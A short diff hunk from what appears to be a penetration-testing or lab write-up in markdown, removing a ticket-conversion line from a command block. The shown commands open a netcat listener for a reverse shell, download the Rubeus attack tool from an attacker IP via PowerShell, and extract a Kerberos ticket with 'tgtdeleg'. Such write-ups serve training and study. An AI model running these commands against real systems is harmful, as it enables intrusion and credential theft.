@@ -244,7 +244,6 @@ rlwrap -cAr nc -lnvp 443
 cd C:\ProgramData
 powershell -c wget 10.10.14.10/Rubeus.exe -outfile Rubeus.exe
 .\rubeus.exe tgtdeleg /nowrap
-kirbi2ccache ticket.kirbi ticket.ccache
 ```
 ![image](https://github.com/user-attachments/assets/283dcf4b-40a0-4cad-a920-d2abe009304a)
 
